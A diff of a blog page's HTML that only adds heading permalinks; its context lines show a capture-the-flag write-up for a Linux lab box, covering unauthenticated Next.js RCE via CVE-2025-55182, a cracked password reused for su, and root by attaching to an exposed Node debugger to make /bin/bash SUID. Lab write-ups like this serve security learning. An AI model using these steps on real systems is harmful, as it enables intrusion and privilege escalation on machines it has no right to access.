@@ -103,9 +103,9 @@
         <div class="post-body">
           <blockquote><p><strong>OS</strong>: Linux | <strong>Difficulty</strong>: Easy | <strong>IP</strong>: 10.129.95.38 <strong>Started</strong>: 2026-09-14 | <strong>Rooted</strong>: 2026-09-14 | <strong>Status</strong>: Completed</p></blockquote>
 <hr>
-<h2 id="summary">Summary</h2>
+<h2 id="summary">Summary<a class="heading-anchor" href="#summary" aria-label="Permalink to this section">#</a></h2>
 <p>Reactor is an easy Linux box. There's a Next.js app on port 3000 that's vulnerable to React2Shell (CVE-2025-55182), so you get code execution as the <code>node</code> user without logging in. The app ships a SQLite database full of MD5 password hashes. The <code>engineer</code> hash cracks to <code>reactor1</code>, and the same password works for the system account. For root, there's a Node.js process running as root with the debugger port open on localhost, so you attach to it and tell it to make <code>/bin/bash</code> SUID.</p>
-<h2 id="recon">Recon</h2>
+<h2 id="recon">Recon<a class="heading-anchor" href="#recon" aria-label="Permalink to this section">#</a></h2>
 <p>Full port scan:</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">sudo nmap -Pn -p- -sC -sV -T4 -oN nmap-scan.txt 10.129.95.38
 </code></pre></div>
@@ -117,7 +117,7 @@ X-Powered-By: Next.js
 x-nextjs-cache: HIT
 </code></pre></div>
 <p>Wappalyzer showed the exact version, Next.js 15.0.3, which is in range for CVE-2025-55182.</p>
-<h2 id="foothold-react2shell-cve-2025-55182">Foothold: React2Shell (CVE-2025-55182)</h2>
+<h2 id="foothold-react2shell-cve-2025-55182">Foothold: React2Shell (CVE-2025-55182)<a class="heading-anchor" href="#foothold-react2shell-cve-2025-55182" aria-label="Permalink to this section">#</a></h2>
 <p>Next.js server actions deserialize request data without checking it properly, so one crafted POST gets you RCE as whatever user runs the app. No auth needed.</p>
 <p>I used the Chocapikk PoC to confirm it first:</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">python3 -m venv venv &amp;&amp; source venv/bin/activate
@@ -141,7 +141,7 @@ export TERM=xterm
 stty raw -echo; fg
 stty rows 54 columns 209
 </code></pre></div>
-<h2 id="getting-to-engineer">Getting to engineer</h2>
+<h2 id="getting-to-engineer">Getting to engineer<a class="heading-anchor" href="#getting-to-engineer" aria-label="Permalink to this section">#</a></h2>
 <p>The <code>reactor.db</code> file is the interesting bit:</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">sqlite3 reactor.db
 sqlite&gt; .tables
@@ -157,11 +157,11 @@ sqlite&gt; select * from users;
 <p>Password is <code>reactor1</code>, and it's reused for the system user:</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">su engineer   # reactor1
 </code></pre></div>
-<h2 id="user-flag">User flag</h2>
+<h2 id="user-flag">User flag<a class="heading-anchor" href="#user-flag" aria-label="Permalink to this section">#</a></h2>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">engineer@reactor:~$ cat user.txt
 # &lt;redacted&gt;
 </code></pre></div>
-<h2 id="root-exposed-node-debugger">Root: exposed Node debugger</h2>
+<h2 id="root-exposed-node-debugger">Root: exposed Node debugger<a class="heading-anchor" href="#root-exposed-node-debugger" aria-label="Permalink to this section">#</a></h2>
 <p>Checking what root is running:</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">ps aux | grep root
 root  1289  ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
@@ -179,13 +179,13 @@ curl -s http://127.0.0.1:9229/json    # returns webSocketDebuggerUrl with a UUID
 # -rwsr-sr-x 1 root root ... /bin/bash
 bash -p
 </code></pre></div>
-<h2 id="root-flag">Root flag</h2>
+<h2 id="root-flag">Root flag<a class="heading-anchor" href="#root-flag" aria-label="Permalink to this section">#</a></h2>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">bash-5.2# cat /root/root.txt
 # &lt;redacted&gt;
 </code></pre></div>
-<h2 id="credentials">Credentials</h2>
+<h2 id="credentials">Credentials<a class="heading-anchor" href="#credentials" aria-label="Permalink to this section">#</a></h2>
 <table><thead><tr><th>User</th><th>Secret</th><th>Source</th></tr></thead><tbody><tr><td>engineer</td><td>reactor1 (cracked MD5)</td><td>reactor.db</td></tr><tr><td>admin</td><td>MD5 hash, didn't crack</td><td>reactor.db</td></tr></tbody></table>
-<h2 id="attack-chain">Attack chain</h2>
+<h2 id="attack-chain">Attack chain<a class="heading-anchor" href="#attack-chain" aria-label="Permalink to this section">#</a></h2>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>Next.js 15.0.3 on port 3000
   │
   ▼
@@ -206,7 +206,7 @@ Runtime.evaluate over websocket → chmod +s /bin/bash
   ▼
 bash -p → root flag
 </code></pre></div>
-<h2 id="references">References</h2>
+<h2 id="references">References<a class="heading-anchor" href="#references" aria-label="Permalink to this section">#</a></h2>
 <ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-55182" target="_blank" rel="noopener noreferrer">CVE-2025-55182 — Next.js Server Actions Deserialization RCE (React2Shell)</a></li><li><a href="https://nodejs.org/en/learn/getting-started/debugging#security-implications" target="_blank" rel="noopener noreferrer">Node.js Debugger — <code>--inspect</code> Security Warning</a></li></ul>
         </div>
 
